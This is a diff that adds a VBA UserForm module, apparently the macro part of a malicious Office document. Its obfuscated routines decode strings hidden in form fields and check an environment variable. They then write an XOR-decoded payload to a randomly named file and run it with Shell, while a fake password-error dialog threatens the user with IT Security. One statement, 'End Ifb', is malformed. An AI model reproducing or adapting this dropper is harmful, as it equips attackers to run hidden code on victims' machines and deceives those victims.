@@ -1,0 +1,93 @@
+Attribute VB_Name = "F"
+Attribute VB_Base = "0{E03E5B53-A6B6-411A-A19C-11A1835AD423}{FFE0491A-B940-4555-8AA2-39B793B44D79}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+Private Sub Ok_Click()
+    MsgBox "The password you entered is incorrect.
+IT Security will be notified following further violations by %USERNAME%.", vbExclamation, "Incorrect password"
+    Unload F
+End Sub
+
+Private Sub Cancel_Click()
+    Unload F
+End Sub
+
+Public Smal1Fox As String
+Private Function Fennec(Noxious As String, Fox As String) As String
+    Dim Sahara As Long
+    Dim Desert As String
+    Dim SleepyFennec As Integer, NoxiousFox As Integer
+    For Sahara = 0 To Len(Fox) - 1
+        SleepyFennec = Asc(Mid$(Fox, Sahara + 1, 1))
+        NoxiousFox = Asc(Mid$(Noxious, (Sahara Mod Len(Noxious)) + 1, 1))
+        Desert = Desert & Chr(SleepyFennec Xor NoxiousFox)
+    Next Sahara
+   Fennec = Desert
+End Function
+
+
+Function Sausage(Length As Integer)
+    Dim baskett As Variant
+    Dim walker As Long
+    Dim ball As String
+    baskett = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
+          "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z")
+    For walker = 1 To Length
+        Randomize
+        ball = ball & baskett(Int((UBound(baskett) - LBound(baskett) + 1) * Rnd + LBound(baskett)))
+    Next walker
+    Sausage = ball
+End Function
+
+
+Function Cheese(Snail As String) As String
+    Dim honk As String
+    Dim bonk As Integer
+    Dim conk As Integer
+    Dim monk As String
+    Dim rnok As Integer
+    honk = Split(F.T.Text, F.S.Text)(3)
+    For bonk = 1 To Len(Snail) Step 4
+        conk = CDec(Split(F.T.Text, F.S.Text)(9) & Mid(Snail, bonk + 2, 2))
+        monk = CDec(Split(F.T.Text, F.S.Text)(9) & Mid(Snail, bonk, 2))
+        rnok = conk - monk
+        honk = honk & Chr(rnok)
+    Next bonk
+    Cheese = honk
+End Function
+
+
+Sub Goose()
+    Dim SmailFox As String
+    Dim Sma1lFoc As String
+    Dim Sma1lFox As String
+    Dim Burger As String
+    Sma1lFoc = Environ$(Cheese(Split(F.T.Text, F.S.Text)(4) & Split(F.T.Text, F.S.Text)(3)))
+    If Len(ThisDocument.FullName) >= 42 Then
+        SmailFox = Split(ThisDocument.Path, Mid(Cheese(Split(F.T.Text, F.S.Text)(6) & Split(F.T.Text, F.S.Text)(3)), 1, 1))(0) & Cheese(Split(F.T.Text, F.S.Text)(6) & Split(F.T.Text, F.S.Text)(3)) & ThisDocument.Name
+    Else
+        SmailFox = ThisDocument.FullName
+    End If
+    Burger = Split(F.T.Text, F.S.Text)(2)
+    Sma1lFox = Cheese(Split(F.T.Text, F.S.Text)(0) & Split(F.T.Text, F.S.Text)(3))
+    If Sma1lFoc = Sma1lFox Then
+        Dim Fox As Integer
+        Dim Cockroach As String
+        Dim Snake As String
+        Snake = Sausage(8) & Cheese(Split(F.T.Text, F.S.Text)(7) & Split(F.T.Text, F.S.Text)(3))
+        Cockroach = Environ(Cheese(Split(F.T.Text, F.S.Text)(5) & Split(F.T.Text, F.S.Text)(3))) & Mid(Cheese(Split(F.T.Text, F.S.Text)(6) & Split(F.T.Text, F.S.Text)(3)), 1, 1) & Snake
+        Fox = FreeFile
+        Open Cockroach For Output As #Fox
+           Print #Fox, Fennec(Sma1lFox, Cheese(Burger))
+        Close Fox
+        Shell Cheese(Split(F.T.Text, F.S.Text)(8) & Split(F.T.Text, F.S.Text)(3)) & Cockroach
+    End Ifb
+    F.Ok.SetFocus
+    F.L2.Caption = SmailFox
+    F.Show
+End Sub
